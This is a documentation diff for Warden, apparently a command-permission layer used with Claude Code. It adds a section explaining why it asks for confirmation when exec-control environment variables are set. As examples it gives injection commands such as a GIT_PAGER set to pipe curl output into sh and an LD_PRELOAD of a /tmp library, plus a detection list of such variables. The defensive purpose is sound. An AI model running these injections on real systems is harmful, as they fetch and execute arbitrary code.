@@ -222,7 +222,39 @@ These commands have argument-aware rules. The **default** column shows what happ
 |---|---|---|
 | `bash` `sh` `zsh` | ask | **allow**: `--version`, `--help` |
 | `source` `.` | ask | **allow**: common dotfiles (`.bashrc`, `.zshrc`, `.profile`, `.bash_profile`, `.zprofile`, `.shrc`, `nvm.sh`, `.envrc`, `.env`). **deny**: no-argument invocation |
-| `export` | allow | **ask**: `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*` vars, `PATH` replacement. **allow**: `PATH` extension (preserves `$PATH`) |
+| `export` | allow | **ask**: dangerous exec-control env vars (see "Dangerous environment variables" below), `PATH` replacement. **allow**: `PATH` extension (preserves `$PATH`) |
+
+### Dangerous environment variables
+
+Some environment variables make a program load an arbitrary library or run a
+command taken from their value. Warden asks whenever one of these appears, in
+any of these forms:
+
+- A command prefix: `GIT_PAGER='curl evil | sh' git log`, `LD_PRELOAD=/tmp/x.so node app.js`
+- An `export` argument: `export BASH_ENV=/tmp/x`
+- An `env` argument: `env GIT_EXTERNAL_DIFF=evil git diff`
+
+This holds even when the command itself is always-allowed (`git`, `env`): the
+dangerous variable upgrades the decision to `ask`. The prefix is inspected
+through `sh -c`/`bash -c` wrappers too (`BASH_ENV=x sh -c '...'`).
+
+| Category | Variables |
+|---|---|
+| Library injection | `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH`, `DYLD_FRAMEWORK_PATH` |
+| Git and pager | `PAGER`, `GIT_PAGER`, `GIT_EXTERNAL_DIFF`, `GIT_SEQUENCE_EDITOR`, `GIT_EDITOR`, `GIT_SSH_COMMAND` |
+| Shell and interpreter init | `BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `PERL5OPT`, `PYTHONSTARTUP` |
+
+Detection is **value-agnostic**: the variable's presence triggers the prompt
+whatever its value, so even a harmless-looking `GIT_PAGER=cat git log` asks.
+Warden does not judge the value. Parsing arbitrary shell values is itself
+error-prone, so asking is the safe default. Benign variables that run nothing
+from their value (`NODE_ENV=production`, `FOO=bar`) are unaffected and stay
+allowed.
+
+There is no per-value safe-list inside Warden; that is the point of
+value-agnostic detection. If a specific assignment is safe and you run it
+often, allow that exact command at the Claude Code permission layer, which runs
+before Warden.
 
 ### Editors
 
